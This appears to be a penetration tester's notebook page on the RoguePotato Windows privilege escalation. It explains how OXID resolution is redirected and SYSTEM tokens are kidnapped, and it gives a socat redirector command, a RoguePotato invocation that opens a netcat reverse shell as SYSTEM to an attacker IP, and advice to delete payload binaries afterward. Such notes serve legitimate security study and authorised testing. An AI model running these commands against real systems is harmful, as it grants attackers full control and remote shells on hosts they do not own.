---
updated: 2026-10-18
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---

## RoguePotato

> [!abstract]+ **Scope**: Local Windows privilege escalation using the RoguePotato exploit; system requirements and execution sequence on Windows 10 build `1809`+ and Windows Server 2019/2022.

- [ ] Confirm `SeImpersonatePrivilege` assignment using `whoami /priv`.
- [ ] Confirm network accessibility from the target host to your remote listener IP on TCP port `135`.
- [ ] Launch a `socat` port redirector on your remote listener host on TCP port `135`.
- [ ] Transfer `RoguePotato.exe` to the target host.
- [ ] Execute `RoguePotato.exe` specifying the remote redirector IP, listening RPC port, and target command.
- [ ] Confirm process creation as `NT AUTHORITY\SYSTEM`.

---

## How RoguePotato works

- RoguePotato bypasses the local OXID resolution restriction introduced in Windows 10 `1809` and Server 2019.
- It redirects OXID resolution requests to an external machine under your control, returns poisoned named pipe bindings to `RPCSS`, and uses Token Kidnapping to obtain `SYSTEM` privileges.
- The attack executes across five operational steps:

1. **Triggering remote DCOM activation**: RoguePotato calls `CoGetInstanceFromIStorage()` with a custom `OBJREF` containing binding strings pointing to your external listener IP. `RPCSS` initiates an OXID resolution (`ResolveOxid2`) query to your listener IP on TCP port 135.
2. **Redirecting OXID requests**: A port forwarder (`socat`) on your remote listener host receives the port 135 connection and forwards the request back to a fake OXID resolver listening on a custom port on the target host.
3. **Returning poisoned RPC bindings**: The fake OXID resolver implements `IObjectExporter` and returns a poisoned named pipe binding string:
   
```
ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]
```
- Windows normalizes the forward slash into `\\localhost\pipe\roguepotato\pipe\epmapper`, connecting `RPCSS` to RoguePotato's named pipe listener.

4. **Capturing NETWORK SERVICE security context**: `RPCSS` connects to the named pipe to execute `IRemUnknown2`. RoguePotato calls `ImpersonateNamedPipeClient()` to acquire the token. The token belongs to `NETWORK SERVICE` but carries the Logon ID (LUID) of the `RPCSS` process.
5. **Executing Token Kidnapping for SYSTEM access**: RoguePotato inspects active process handles inside the `rpcss` process context, extracts existing `NT AUTHORITY\SYSTEM` token handles, duplicates them via `DuplicateTokenEx()`, and launches the target process using `CreateProcessWithTokenW()`.

> [!note] See [[Access tokens and impersonation]].

## Setting up the remote redirector

- Set up a `socat` redirector on your external listener host before executing the target binary.
- This redirects incoming TCP port 135 resolution queries from `RPCSS` back to port `9999` on the target host:

```bash
socat tcp-listen:135,reuseaddr,fork tcp:<target_ip_address>:9999
```

- Confirm remote port connectivity from the target host:

```powershell
Test-NetConnection -ComputerName <attacker_ip_address> -Port 135
```

## Exploiting local privilege escalation via RoguePotato

- Download the RoguePotato binary archive on your attacker machine:

```bash
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
```

- Execute RoguePotato to spawn a reverse shell as `SYSTEM`:

```powershell
RoguePotato.exe -r <attacker_ip_address> -e "cmd.exe /c C:\Windows\Temp\nc.exe <attacker_ip_address> 4444 -e cmd.exe" -l 9999
```

- Execute RoguePotato with an explicit CLSID:

```powershell
RoguePotato.exe -r <attacker_ip_address> -c "{B91D5831-B1FC-4019-A484-E3AE6F8640D3}" -e "cmd.exe" -l 9999
```

### Command parameter reference

| Option | Description |
| :--- | :--- |
| `-r` | IP address of the external machine running the `socat` port 135 redirector. |
| `-e` | Command binary string executed under the stolen `SYSTEM` primary token. |
| `-l` | Local RPC Port | Local listening port for the fake OXID resolver (default: `9999`). |
| `-c` | CLSID GUID | Custom CLSID GUID for DCOM object activation. |
| `-p` | Pipe Name | Custom named pipe name (default: `roguepotato`). |
| `-z` | Random Pipe | Randomizes generated named pipe string. |

## Troubleshooting


- No incoming traffic on port `135` -> Network firewall blocking outbound TCP `135`; verify network routing with `Test-NetConnection`. 
- Impersonation level is `Identification` -> OXID query routed to local resolver; confirm `-r` flag references the remote redirector IP. 
- Token Kidnapping handle failure -> Target `rpcss` instance lacks accessible `SYSTEM` handle; specify an alternative CLSID GUID using the `-c` parameter. 

> [!tip]+
> - Delete temporary payload binaries (`RoguePotato.exe`, `nc.exe`) from disk.

## References and further reading

- [`RoguePotato — GitHub (antonioCoco)`](https://github.com/antonioCoco/RoguePotato)
- [`No more JuicyPotato? Old story, welcome RoguePotato! — Decoder's Blog`](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [`From NETWORK SERVICE to SYSTEM — Decoder's Blog`](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [`Windows Privilege Escalation — Potatoes — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
